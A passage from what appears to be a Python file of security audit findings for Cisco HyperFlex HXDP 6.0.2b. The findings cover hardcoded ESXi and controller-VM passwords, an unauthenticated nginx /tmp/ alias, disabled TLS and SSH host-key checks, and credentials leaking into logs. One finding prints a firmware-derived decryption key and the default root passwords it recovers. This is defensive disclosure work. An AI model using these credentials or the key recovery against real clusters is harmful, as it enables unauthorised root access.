        "upgrade-war/WEB-INF/classes/application.conf line 48: barredUsers = [\"root\", \"local/root\"]",
        "diag and local/diag absent from upgrade-war barredUsers — not blocked by upgrade filter",
        "upgrade-war hosts /upgrade/* and /rest/about endpoints with separate auth configuration",
        "Security policy intent: bar diag from all cluster API access — not enforced by upgrade-war",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Synchronize barredUsers across all components that perform authentication. "
        "Both authfilter and upgrade-war must bar the same set of privileged accounts: "
        "[\"root\", \"local/root\", \"diag\", \"local/diag\"]. "
        "Consider centralizing the barredUsers list in a single configuration source "
        "consumed by all authenticating components to prevent future drift. "
        "Audit other web application components in the HX stack for barredUsers "
        "configurations and verify consistency."
    ),
    "tags": ["authorization", "diag", "barredusers", "cwe-863", "upgrade-war", "high"],
}

HX_F201 = {
    "id": "HX-F201",
    "title": "Hardcoded Default ESXi Password 'springpath' Used if No Override Provided",
    "severity": "HIGH",
    "cvss": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-1392",
    "component": (
        "storfs-deploy/ansible/roles/compute/files/configureNetworking_VCenter.py / "
        "SpringpathNetworkingSetup_VCenter class"
    ),
    "description": (
        "configureNetworking_VCenter.py declares `ESX_PWD = \"springpath\"` as a "
        "class-level default (line 319). "
        "This value is used directly for SSH and vCenter API authentication against "
        "cluster ESXi hosts at lines 731, 809, and 1331 before any credential override "
        "is applied. "
        "If the script is invoked without an `--esx-password` argument or without a "
        "JSON config file containing `esxPassword`, all ESXi host authentication "
        "proceeds with the literal string `springpath` — the inherited default "
        "credential from HyperFlex's Springpath acquisition heritage. "
        "The same default appears in help text for `--ctl-password` (controller password). "
        "ESXi hosts that were provisioned without explicit password override and that "
        "still carry the Springpath default are accessible to anyone who knows this "
        "widely-published default. "
        "The credential is embedded in four separately-packaged copies of the script "
        "(ansible/configureNetworking_VCenter.py, roles/compute/files/, "
        "roles/esx/files/, roles/springpathvm/files/, roles/upgrademigration/files/), "
        "amplifying the exposure surface."
    ),
    "evidence": [
        "configureNetworking_VCenter.py line 319: ESX_PWD = \"springpath\"",
        "configureNetworking_VCenter.py line 387-389: help text confirms 'springpath' default for ESXi and controller",
        "Line 731: ssh_connect(host, SpringpathNetworkingSetup_VCenter.ESX_USER, SpringpathNetworkingSetup_VCenter.ESX_PWD)",
        "Line 809: same class method uses ESX_PWD directly",
        "Line 1331: isHXHardware(esx_host, ESX_USER, ESX_PWD) — hardware probe with default credential",
        "Script present in 5 Ansible role directories — same hardcoded default in all copies",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the hardcoded default from the class definition. "
        "If no ESXi password is supplied via argument or config file, the script "
        "must exit with an error rather than proceeding with a known default. "
        "Audit deployed HyperFlex clusters for ESXi hosts where the root or service "
        "account password was never changed from the Springpath-era default 'springpath'. "
        "Rotate credentials on any such host immediately. "
        "Consider credential validation at cluster bootstrapping to detect and reject "
        "the default value."
    ),
    "tags": ["hardcoded-credential", "default-password", "springpath", "esxi", "cwe-1392", "high"],
}

HX_F202 = {
    "id": "HX-F202",
    "title": "nginx /sbdl/ Location Aliases /tmp/ Over HTTP With No Authentication",
    "severity": "CRITICAL",
    "cvss": 9.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-284",
    "component": "storfs-misc/nginx.conf / HTTP server (port 80) / location /sbdl/",
    "description": (
        "nginx.conf configures a `location /sbdl/` block in the HTTP (port 80) server "
        "with `alias /tmp/;` and `auth_basic off`. "
        "The HTTP server's catch-all `location /` redirects to HTTPS, but nginx "
        "location specificity rules cause `/sbdl/` to match before the redirect — "
        "requests to `http://<node>/sbdl/<filename>` are served directly without "
        "redirecting to HTTPS and without authentication. "
        "Any file in `/tmp/` is readable by any network-reachable client with no "
        "credentials and no TLS. "
        "Files known to reside in `/tmp/` during HyperFlex operations include: "
        "upgrade bundles at predictable paths (`/tmp/hxupgrade_bundle.tgz`, "
        "`/tmp/storfs-packages*.tgz`, `/tmp/HX-ESXi-*.zip`) confirmed by the "
        "9997_post_upgrade_cleanup_ESX.py cleanup script; "
        "support bundle staging files created by the support bundle collection workflow; "
        "any ansible or process temp files written there during cluster operations. "
        "The comment in nginx.conf labels this location 'support bundle download', "
        "confirming the intent — but the scope of the alias is the entire /tmp/ directory, "
        "not a scoped subdirectory. "
        "The same HTTP server block exposes `/support` (aliased to `/var/support/`), "
        "`/images`, and `/logs` without authentication, and a `/upload` endpoint "
        "proxied to localhost:8000 with no auth and `client_max_body_size 8000m` "
        "(8 GB limit)."
    ),
    "evidence": [
        "nginx.conf line 62-66 (HTTP server block, port 80):",
        "  location /sbdl/ { alias /tmp/; auth_basic off; }",
        "No deny rules, no auth_request gate, no IP restriction",
        "HTTP location /sbdl/ is more specific than location / (redirect) — not HTTPS-redirected",
        "9997_post_upgrade_cleanup_ESX.py filesDir confirms /tmp/hxupgrade_bundle.tgz et al. as known residents",
        "nginx.conf line 68-73: location /support { auth_basic off; alias /var/support/; allow all; }",
        "nginx.conf line 94-98: location /upload { auth_basic off; allow all; proxy_pass http://localhost:8000; }",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace `alias /tmp/;` with a scoped subdirectory dedicated to "
        "support bundle staging (e.g., `alias /opt/hyperflex/sbdl-staging/;`) "
        "with permissions preventing other processes from writing there. "
        "Gate the endpoint with `auth_request /auth;` to require a valid HX session token. "
        "If unauthenticated support bundle download is a product requirement, "
        "scope it to a one-time download token issued at bundle-creation time and "
        "serve it over HTTPS only. "
        "Move /support, /images, /logs, and /upload into the HTTPS server block with "
        "auth_request gates."
    ),
    "tags": ["nginx", "unauthenticated", "file-disclosure", "tmp", "http", "cwe-284", "critical"],
}

HX_F203 = {
    "id": "HX-F203",
    "title": "CIMC and ESXi Credentials Passed as CLI Arguments to hx_edge — Visible in Process Table",
    "severity": "HIGH",
    "cvss": 7.0,
    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-214",
    "component": (
        "storfs-deploy/ansible/roles/cimc/tasks/configure.yml / "
        "hx_edge gen-inventory command"
    ),
    "description": (
        "cimc/tasks/configure.yml executes the `hx_edge` binary with CIMC and ESXi "
        "credentials passed as positional CLI arguments on two code paths. "
        "Code path 1 (line 109, when basePath == ''): "
        "`hx_edge --cimc-password='{{ cimcPassword | b64decode }}' "
        "--host-password='{{ esxPassword | b64decode }}'`. "
        "Code path 2 (line 120, when basePath != ''): "
        "`hx_edge --cimc-password='{{ cimcPassword | b64decode }}' "
        "--host-password='{{ hostPassword }}'`. "
        "The second code path passes `hostPassword` without base64 decoding, "
        "suggesting it may already be plaintext. "
        "CIMC (Cisco Integrated Management Controller) is out-of-band management "
        "infrastructure — its credentials grant hardware-level control independent "
        "of the operating system (power cycle, KVM console, firmware update, sensor access). "
        "Both code paths use `no_log: True` in Ansible to suppress task output "
        "in the playbook log, but `no_log` does not prevent the spawned subprocess "
        "from appearing in `/proc/<pid>/cmdline` or `ps aux` output on the target node "
        "during the window the command runs. "
        "Any local user on the HyperFlex node can read CIMC credentials from the "
        "process table during deployment or CIMC re-provisioning operations."
    ),
    "evidence": [
        "configure.yml line 109: command: hx_edge --cimc-password='{{ cimcPassword | b64decode }}' --host-password='{{ esxPassword | b64decode }}'",
        "configure.yml line 120: command: hx_edge --cimc-password='{{ cimcPassword | b64decode }}' --host-password='{{ hostPassword }}'",
        "no_log: True suppresses Ansible playbook log only — does not clear /proc/<pid>/cmdline",
        "hxEdge resolved at line 14: /bin/hx_edge or {basePath}/packages/hx_imc_mfg/hx_edge.py",
        "CIMC credentials = hardware-level out-of-band management access (power, KVM, firmware)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Pass credentials via environment variables or a temporary credentials file "
        "with 0600 permissions rather than as CLI arguments. "
        "For the hx_edge binary: add a `--cimc-password-file` flag that reads from "
        "a file path, or read from stdin. "
        "The file should be created with mkstemp, written, passed by path, and "
        "deleted immediately after the subprocess exits. "
        "Environment variable delivery (`CIMC_PASSWORD=xxx hx_edge ...`) prevents "
        "process table exposure on Linux since environment variables are not visible "
        "to other users in /proc/<pid>/environ by default."
    ),
    "tags": ["cimc", "oob-management", "process-table", "cwe-214", "ansible", "high"],
}

HX_F204 = {
    "id": "HX-F204",
    "title": "Factory OVA Deployment Disables Both TLS and OVF Package Verification via ovftool Flags",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H",
    "cwe": "CWE-354",
    "component": (
        "factory/opt/hyperflex/storfs-factory/ansible/library/deployOva.py / "
        "ovftool invocation"
    ),
    "description": (
        "deployOva.py constructs an ovftool command with both `--noSSLVerify` and "
        "`--disableVerification` flags for controller VM deployment during factory provisioning. "
        "The full ovftool invocation at line 71-73: "
        "`/usr/bin/ovftool --allowExtraConfig --acceptAllEulas --disableVerification "
        "--noSSLVerify --datastore=... vi://esxUserName:esxEncodedPassword@hostname`. "
        "`--noSSLVerify` disables TLS certificate verification for the ESXi connection, "
        "allowing MITM of the transport layer. "
        "`--disableVerification` disables OVF manifest, certificate, and checksum "
        "verification for the OVA package itself. "
        "Combined, an on-path attacker can intercept the factory deployment connection "
        "and substitute a trojanized controller VM OVA without detection. "
        "The controller VM is the HyperFlex storage controller — its compromise "
        "gives full access to the cluster's data path, encryption keys, and "
        "cluster management APIs from the first boot. "
        "The ESXi credentials are also embedded in the `vi://user:pass@host` URL "
        "passed as a CLI argument to ovftool, making them visible in "
        "`/proc/<pid>/cmdline` during deployment."
    ),
    "evidence": [
        "deployOva.py line 71-73: ovftool --allowExtraConfig --acceptAllEulas --disableVerification --noSSLVerify ... vi://user:pass@host",
        "--noSSLVerify: TLS cert verification disabled for ESXi connection",
        "--disableVerification: OVF manifest, cert, and checksum verification disabled",
        "vi://user:pass@host URL with credentials in process argument list",
        "Target: controller VM (HyperFlex storage controller) — cluster data-path root",
        "deployOva.py line 77: Popen(shlex.split(cmd), shell=False) — credentials in /proc/<pid>/cmdline",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove `--noSSLVerify` and `--disableVerification` from the ovftool invocation. "
        "For factory environments with self-signed ESXi certs, pre-distribute the "
        "factory CA certificate and configure ovftool's `--sslCertThumbprint` or "
        "`--sslCipherList` options rather than disabling verification entirely. "
        "Sign factory OVA packages with a Cisco-controlled private key and verify "
        "signatures at deployment time. "
        "Replace the `vi://user:pass@host` URL form with a credentials file approach "
        "or environment variable injection to avoid process table exposure."
    ),
    "tags": ["ovftool", "factory", "tls", "package-verification", "cwe-354", "cwe-295", "high"],
}

HX_F205 = {
    "id": "HX-F205",
    "title": "Controller VM Default Password 'Cisco123' Recoverable From Firmware-Shipped AES Key",
    "severity": "CRITICAL",
    "cvss": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": "CWE-321",
    "component": (
        "storfs-misc/springpath_env_parse.py / springpath_default.tunes / "
        "storfs-misc/Secret.class"
    ),
    "description": (
        "springpath_env_parse.py derives the AES-CBC decryption key for "
        "controller VM credentials from `MD5(/usr/share/hyperflex/storfs-misc/Secret.class)`. "
        "`Secret.class` is a Java class file shipped as firmware — identical across "
        "all HXDP 6.0.2b installations. "
        "springpath_default.tunes ships with three AES-CBC encrypted credentials: "
        "`stctl_vm_passwd`, `ssl_cert_passwd`, and `installer_passwd`. "
        "The comment at springpath_env_parse.py line 43-44 states: "
        "'Secret is derived by using complex text which is not easy to guess or read.' "
        "This claim is false — the key source is a public firmware file. "
        "Decryption using `MD5(Secret.class) = 1f6d13bcd7753f2d3b2e2da361b7afb5`: "
        "stctl_vm_passwd → 'Cisco123' (controller VM root password). "
        "installer_passwd → 'Cisco123' (same encrypted value, same decrypted password). "
        "ssl_cert_passwd → 'springpath'. "
        "Any actor with access to the firmware image (publicly extractable) can derive "
        "the decryption key in under 1 second and recover all three credentials. "
        "The controller VM (stCtlVM) is the HyperFlex storage controller — root access "
        "to it gives full control over the cluster's data path, encryption key management, "
        "ZooKeeper state, and management API. "
        "Every HXDP 6.0.2b cluster that has not had its stCtlVM root password explicitly "
        "rotated is accessible with the credential 'Cisco123' recovered from this analysis."
    ),
    "evidence": [
        "springpath_env_parse.py line 35: ENV_VARIABLE_STCTL_PASS = '/usr/share/hyperflex/storfs-misc/Secret.class'",
        "springpath_env_parse.py line 84-86: if 'stctl_vm_passwd': file_md5 = md5(Secret.class); decoded = decrypt(file_md5, value)",
        "springpath_default.tunes line 87: stctl_vm_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=",
        "springpath_default.tunes line 88: ssl_cert_passwd=yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s=",
        "springpath_default.tunes line 90: installer_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=",
        "MD5(Secret.class) = 1f6d13bcd7753f2d3b2e2da361b7afb5 (computed from shipped firmware)",
        "AES-CBC decrypt(key=1f6d13bcd7753f2d3b2e2da361b7afb5, enc=stctl_vm_passwd) → b'Cisco123'",
        "AES-CBC decrypt(key=1f6d13bcd7753f2d3b2e2da361b7afb5, enc=ssl_cert_passwd) → b'springpath'",
        "springpath_env_parse.py comment: 'Secret is derived by using complex text which is not easy to guess or read' — false claim",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace the file-MD5 key derivation with a genuine per-cluster secret "
        "generated at provisioning time and stored in a hardware security module or "
        "platform-specific secure storage (TPM, vTPM, UEFI secure variable). "
        "Rotate the stCtlVM root password on all deployed clusters immediately. "
        "Remove the stctl_vm_passwd, ssl_cert_passwd, and installer_passwd values "
        "from springpath_default.tunes in the firmware image — any credential that "
        "ships identically in every firmware package is a shared cluster secret by design. "
        "Post-rotation, the new password must be stored outside the firmware image, "
        "generated uniquely per cluster, and inaccessible to unprivileged cluster processes."
    ),
    "tags": ["hardcoded-key", "aes", "controller-vm", "cisco123", "cwe-321", "cwe-798", "critical"],
}

HX_F206 = {
    "id": "HX-F206",
    "title": "ESXi Kickstart Provisioning Sets Root Password to 'springpath' Across All Nodes",
    "severity": "HIGH",
    "cvss": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-1392",
    "component": (
        "storfs-deploy/ansible/ks-default.cfg / ESXi kickstart provisioning"
    ),
    "description": (
        "ks-default.cfg is the kickstart script used for scripted ESXi installation "
        "on all HyperFlex compute nodes. "
        "Line 12: `rootpw springpath`. "
        "This directive sets the ESXi root password to the literal string `springpath` "
        "on every node installed via this kickstart file. "
        "The `configureNetworking_VCenter.py` script's default `ESX_PWD = 'springpath'` "
        "(HX-F201) is directly derived from this kickstart default — the script assumes "
        "that nodes not yet provisioned with a custom password will still carry the "
        "kickstart default. "
        "ESXi root is the hypervisor management account with full control over all VMs, "
        "datastores, and host configuration. "
        "Any ESXi node where the post-installation password rotation step failed, "
        "was skipped, or was not enforced remains accessible with `root`/`springpath`. "
        "The credential is identical across all HyperFlex nodes provisioned from this "
        "kickstart template, eliminating any per-node secret."
    ),
    "evidence": [
        "ks-default.cfg line 12: rootpw springpath",
        "ks-default.cfg is the scripted ESXi installation file for all HyperFlex cluster nodes",
        "configureNetworking_VCenter.py ESX_PWD = 'springpath' default confirms this is the operational default",
        "ESXi root provides full hypervisor control: VM power, datastores, host networking, firewall",
        "No per-node unique credential — all nodes share the same kickstart-set password",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the `rootpw springpath` directive from ks-default.cfg. "
        "Replace with a placeholder or a randomly generated per-node password "
        "injected at provisioning time via Ansible `--extra-vars` or from a "
        "credentials vault. "
        "Enforce post-provisioning password rotation as a required deployment step. "
        "Audit all deployed HyperFlex clusters for ESXi nodes where the root "
        "password has not been changed from the kickstart default."
    ),
    "tags": ["kickstart", "esxi", "default-password", "springpath", "cwe-1392", "high"],
}

HX_F207 = {
    "id": "HX-F207",
    "title": "SSH Host Key Verification Disabled System-Wide Across Ansible Management Plane",
    "severity": "HIGH",
    "cvss": 7.4,
    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-295",
    "component": (
        "ansible/addhost.yml, replaceNode.sh, library/setstaticip.py, "
        "library/scpFile.py, validation/run-validate-hw.sh"
    ),
    "description": (
        "SSH host key verification is disabled across all HyperFlex management "
        "plane scripts using two mechanisms: `StrictHostKeyChecking=no` (prevents "
        "host key mismatch errors) and `UserKnownHostsFile=/dev/null` (prevents "
        "known_hosts accumulation). "
        "These options appear in at least 5 separate scripts/playbooks covering "
        "VIB upgrade, node replacement, CIMC SSH access, file transfers, and "
        "hardware validation. "
        "addhost.yml line 50: `ansible_ssh_common_args='-o UserKnownHostsFile=/dev/null "
        "-o StrictHostKeyChecking=no'` — applied to all Ansible SSH connections "
        "during VIB upgrade operations. "
        "replaceNode.sh lines 159/165/172: `sshpass -p $PASSWD ssh -q -o "
        "StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null` — the password "
        "is additionally passed as a `sshpass -p` argument, visible in process table. "
        "library/scpFile.py lines 112-114: same pattern for cluster file transfers. "
        "library/setstaticip.py line 61: CIMC SSH without host key verification. "
        "An on-path attacker can silently MITM any SSH connection from the "
        "HyperFlex controller VM to ESXi hosts, CIMC, or other cluster nodes "
        "during any management operation. The management plane will authenticate "
        "to the attacker's machine, potentially delivering valid credentials "
        "and accepting attacker-controlled command output as authoritative."
    ),
    "evidence": [
        "addhost.yml line 50: ansible_ssh_common_args='-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'",
        "replaceNode.sh line 159: sshpass -p $PASSWD ssh -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
        "scpFile.py line 112: sshpass -p remotevm_password scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null",
        "setstaticip.py line 61: ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null (CIMC connection)",
        "run-validate-hw.sh line 40: sshpass -f $PASS_FILE ssh -o StrictHostKeyChecking=no",
        "replaceNode.sh passes password via sshpass -p (CWE-214: visible in process table)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace `StrictHostKeyChecking=no` with `StrictHostKeyChecking=yes` in all "
        "scripts. "
        "Maintain a cluster-managed known_hosts file that is pre-populated at "
        "provisioning time with each node's SSH host key fingerprint. "
        "For CIMC connections, retrieve and pin the CIMC SSH host key during "
        "initial provisioning and validate against it in subsequent connections. "
        "Replace `sshpass -p <password>` with SSH key-based authentication — "
        "deploy cluster SSH keys (already generated by generateSshKeys.py) and "
        "use them for all management plane connections instead of password auth."
    ),
    "tags": ["ssh", "host-key", "mitm", "ansible", "sshpass", "cwe-295", "high"],
}

HX_F208 = {
    "id": "HX-F208",
    "title": "SSH Credentials Inserted Into Debug Log via Exception Error String",
    "severity": "MEDIUM",
    "cvss": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-532",
    "component": (
        "storfs-misc/uninstall_cluster.py, storfs-misc/listzkdb.py"
    ),
    "description": (
        "Two scripts construct Paramiko SSH exception error strings that include "
        "the SSH password in plaintext, and those strings are written to the "
        "debug log on any connection failure. "
        "uninstall_cluster.py line 69: `stderr = ('Paramiko ssh connect "
        "exception: %s, host %s user: %s password: %s' % (e, address, username, "
        "password))`. "
        "This string is placed into a multiprocessing Queue at line 72, then read "
        "by `_executeCmdOverSSH` at line 548 into a local `stderr` variable. "
        "Line 560 evaluates `if (verbose or ret is None or (int(ret) != 0))` — "
        "this condition is True when the connection fails (ret=-1). "
        "Line 564 calls `logging.debug(msg)` with a message that includes `stderr`, "
        "writing the password to the rotating file handler configured at "
        "DEBUG level (RotatingFileHandler imported at line 34). "
        "listzkdb.py line 44 contains an identical pattern: "
        "`stderr = ('Paramiko ssh connect exception: %s, host: %s user: %s "
        "password: %s' % (e, server, username, password))` — returned to caller "
        "on connection failure. "
        "If the SSH user is root with default credential `Cisco123` (established "
        "in the spring_default.tunes AES decryption), the credential is written "
        "to the debug log on any SSH connectivity issue."
    ),
    "evidence": [
        "uninstall_cluster.py line 69: stderr = ('Paramiko ssh connect exception: %s, host %s user: %s password: %s' % (e, address, username, password))",
        "uninstall_cluster.py line 72: q.put([stdout, stderr, -1])",
        "uninstall_cluster.py line 553: stderr += output[1] (queue consumer appends password-containing string)",
        "uninstall_cluster.py line 560-564: if (verbose or ret is None or (int(ret) != 0)): ... logging.debug(msg) where msg includes stderr",
        "listzkdb.py line 44: identical error-string construction in execute_cmd_over_ssh()",
        "logger configured with RotatingFileHandler at DEBUG level (line 34, 601)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the `password` field from exception error strings in both files. "
        "Replace with a placeholder: `'Paramiko ssh connect exception: %s, "
        "host: %s user: %s password: [REDACTED]' % (e, address, username)`. "
        "Audit all logging calls that include stderr output for credential leakage. "
        "For uninstall_cluster.py, filter the queue output before logging to strip "
        "any field matching the pattern `password: <value>`."
    ),
    "tags": ["credential-leak", "logging", "paramiko", "cwe-532", "medium"],
}

HX_F209 = {
    "id": "HX-F209",
    "title": "ZooKeeper Authentication Disabled by Default Exposes SSL Private Key",
    "severity": "MEDIUM",
    "cvss": 6.7,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-284",
    "component": (
        "upgrade-hooks/.../0008_cleanup_historical_job_ESX.py, "
        "stcli-egg/stCli/postEvent.py, "
        "storfs-mgmt/hxSvcMgr-1.0/conf/application.conf"
    ),
    "description": (
        "ZooKeeper authentication is disabled by default across the HyperFlex "
        "cluster. The `useZKAuth` flag is read from `/etc/springpath/storfs.cfg` "
        "or `/etc/hyperflex/storfs.cfg` and defaults to `False` when the key is "
        "absent (0008_cleanup_historical_job_ESX.py line 128: "
        "`useZKAuth = False`; postEvent.py line 194: `useZKAuth = False`). "
        "With ZK auth disabled, no ACLs are enforced on ZooKeeper znodes. "
        "The SSL private key is stored in ZooKeeper at the path configured in "
        "hxSvcMgr-1.0/conf/application.conf line 131: "
        "`sslKeyZKPath = '/storvisor/ssl/key'`. "
        "Any process that can reach ZooKeeper on port 2181 — bound to "
        "`127.0.0.1:2181` but accessible to all local processes on the "
        "controller VM — can read the private key without credentials. "
        "The TLS certificate is at `/storvisor/ssl/certificate` (line 130). "
        "An attacker with local access to the controller VM can extract the "
        "cluster TLS private key directly from ZooKeeper, enabling impersonation "
        "of the HyperFlex management interface."
    ),
    "evidence": [
        "0008_cleanup_historical_job_ESX.py line 128: useZKAuth = False (default before storfs.cfg read)",
        "postEvent.py line 194: useZKAuth = False (same default in second codebase)",
        "hxSvcMgr-1.0/conf/application.conf line 131: sslKeyZKPath = '/storvisor/ssl/key'",
        "hxSvcMgr-1.0/conf/application.conf line 130: sslCertZKPath = '/storvisor/ssl/certificate'",
        "0008_cleanup_historical_job_ESX.py line 108: KazooClient(hosts=zk_connection_str) — no auth passed when useZKAuth=False",
        "ZooKeeper binds on 127.0.0.1:2181 — accessible to all controller VM processes",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Set `useZKAuth=True` in storfs.cfg as the default configuration at "
        "provisioning time, not as an optional post-upgrade step. "
        "Apply ZooKeeper ACLs on sensitive znodes (including `/storvisor/ssl/key` "
        "and `/storvisor/ssl/certificate`) so they are only readable by the "
        "specific service accounts that require them. "
        "Consider storing the cluster TLS private key in a dedicated secrets "
        "manager (Vault, KMIP) rather than ZooKeeper, which is a distributed "
        "coordination service not designed for secrets storage."
    ),
    "tags": ["zookeeper", "tls-key", "default-config", "cwe-284", "medium"],
}

HX_F210 = {
    "id": "HX-F210",
    "title": "ZooKeeper Authentication Token Derived from World-Readable Cluster UUID File",
    "severity": "MEDIUM",
    "cvss": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-287",
    "component": (
        "upgrade-hooks/.../0008_cleanup_historical_job_ESX.py, "
        "stcli-egg/stCli/postEvent.py"
    ),
    "description": (
        "When ZooKeeper authentication is enabled (`useZKAuth=True`), the "
        "authentication token is constructed as the cluster UUID read from a "
        "plaintext file, providing no meaningful access control. "
        "0008_cleanup_historical_job_ESX.py lines 111-115: "
        "`auth = self.getZkAuthToken()` reads from `/etc/springpath/clusteruuid`; "
        "`auth_data = 'zkjobdelete;' + auth`; "
        "`self.zkClient.add_auth('UUID', auth_data)`. "
        "postEvent.py lines 176-180: identical pattern reading from "
        "`/etc/hyperflex/clusteruuid`. "
        "The `getZkAuthToken()` method (0008_cleanup_historical_job_ESX.py "
        "line 146) opens the clusteruuid file directly with no permission check "
        "beyond the OS filesystem ACL. "
        "The cluster UUID is not a secret: it is the same value stored in "
        "`/etc/hyperflex/stMgr.cfg` (cluster.stmgrCfg), distributed across all "
        "cluster nodes, and referenced in multiple configuration files. "
        "Any local user who can read `/etc/springpath/clusteruuid` can construct "
        "the full ZK auth token `'zkjobdelete;' + uuid` and authenticate to "
        "ZooKeeper with the same privileges as privileged cluster services, "
        "defeating the purpose of enabling ZK auth."
    ),
    "evidence": [
        "0008_cleanup_historical_job_ESX.py line 113: auth_data = 'zkjobdelete;' + auth",
        "0008_cleanup_historical_job_ESX.py line 115: self.zkClient.add_auth('UUID', auth_data)",
        "0008_cleanup_historical_job_ESX.py line 151-153: reads /etc/springpath/clusteruuid as auth token source",
        "postEvent.py line 180: self.zkClient.add_auth('UUID', auth_data) — same pattern",
        "postEvent.py line 219-221: reads /etc/hyperflex/clusteruuid",
        "hxSvcMgr-1.0/conf/application.conf line 100: clusterUuidFile = '/etc/hyperflex/clusteruuid' (referenced cluster-wide)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace the cluster UUID as the ZK authentication secret with a "
        "cryptographically random credential generated at cluster provisioning "
        "time and stored with appropriate filesystem permissions (mode 0600, "
        "owned by the service account). "
        "The auth file should not be the same UUID used for cluster identity "
        "and distributed in cluster configuration. "
        "Use ZooKeeper's built-in `digest` authentication scheme with a "
        "service-specific username and hashed password rather than a custom "
        "'UUID' scheme with a predictable token."
    ),
    "tags": ["zookeeper", "authentication", "cluster-uuid", "cwe-287", "medium"],
}

HX_F211 = {
    "id": "HX-F211",
    "title": "SSO Session ID and Authorization Header Logged in Plaintext to Debug Log",
    "severity": "MEDIUM",
    "cvss": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": "CWE-532",
    "component": (
        "stcli-egg/stCli/StTransportBase.py, "
        "storfs-misc/setup_kerberos.py, "
        "storfs-misc/livemigration.py"
    ),
    "description": (
        "The stcli transport base class logs both the SSO session ID and the "
        "Authorization HTTP header value in plaintext at DEBUG level before "
        "including them in outbound Thrift API requests. "
        "StTransportBase.py line 111: "
        "`logging.debug('Setting X-SSOSessionID: %s', sso_session_id)` — "
        "SSO session token written to the rotating debug log. "
        "StTransportBase.py line 114: "
        "`logging.debug('Setting Authorization header: %s', authorization_header)` — "
        "Authorization header value (bearer token, basic auth, or session token "
        "passed via environment variable `Authorization`) written to debug log. "
        "The same pattern is replicated verbatim in setup_kerberos.py lines 128/131 "
        "and livemigration.py lines matching the same call sites. "
        "The debug logger is configured with a RotatingFileHandler at DEBUG level "
        "(StTransportBase.py lines 61-67), writing to paths including "
        "`/var/log/hyperflex/pollds.log` (dsStats.py) and service-specific logs. "
        "A local attacker with read access to the log files can extract valid "
        "session tokens for replay against the HyperFlex management API without "
        "re-authenticating."
    ),
    "evidence": [
        "StTransportBase.py line 111: logging.debug('Setting X-SSOSessionID: %s', sso_session_id)",
        "StTransportBase.py line 114: logging.debug('Setting Authorization header: %s', authorization_header)",
        "StTransportBase.py lines 61-67: RotatingFileHandler configured at DEBUG level",
        "setup_kerberos.py line 128: logger.debug('Setting X-SSOSessionID: %s', sso_session_id)",
        "setup_kerberos.py line 131: logger.debug('Setting Authorization header: %s', authorization_header)",
        "StMgrTransport.py line 26: self.scheme = 'https' (stMgr uses TLS)",
        "setup_kerberos.py line 114: url = '%s://%s:%s' % ('http', ...) — HxHyperVSvcMgr transport cleartext HTTP",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Remove the credential values from debug log statements in "
        "`StTransportBase.py`, `setup_kerberos.py`, and `livemigration.py`. "
        "Replace with opaque indicators: `logging.debug('X-SSOSessionID set')` "
        "and `logging.debug('Authorization header set')`. "
        "Audit all logging calls that include HTTP header values and session tokens "
        "for credential leakage. "
        "For the HxHyperVSvcMgr connection in setup_kerberos.py (port 9340), "
        "migrate from plain HTTP to HTTPS to prevent localhost interception "
        "by malicious processes on the controller VM."
    ),
    "tags": ["credential-leak", "logging", "session-token", "cwe-532", "medium"],
}

HX_F212 = {
    "id": "HX-F212",
    "title": "OS Command Injection via Unescaped vCenter Password in Shell Command",
    "severity": "MEDIUM",
    "cvss": 6.3,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N",
    "cwe": "CWE-78",
    "component": "storfs-misc/hx-scripts/reRegisterClusterToVC.py",
